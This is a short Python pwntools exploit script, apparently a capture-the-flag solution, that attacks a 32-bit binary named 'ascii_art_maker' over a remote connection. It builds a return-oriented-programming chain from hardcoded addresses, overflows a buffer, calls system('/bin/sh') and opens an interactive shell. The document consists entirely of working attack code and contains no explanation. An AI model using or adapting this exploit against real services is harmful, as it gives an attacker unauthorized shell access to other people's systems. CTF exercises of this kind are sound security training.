#!/usr/bin/env python
import sys, os
from pwn import *

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('ascii_art_maker'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)
pause()

buf = 0x0804c420

rop = p32(buf) * 6
rop = rop.ljust(0xb0, 'a') + ' '*0xc + p32(0x080482a1)*6 + p32(0x08048784) + p32(buf+0xc4)
rop += flat(elf.sym['system'], 'bbbb', p32(0x0804c508), '/bin/sh;', '\x7f')
assert len(rop) <= 256
assert '\x00' not in rop
r.sendline(rop)

r.interactive()
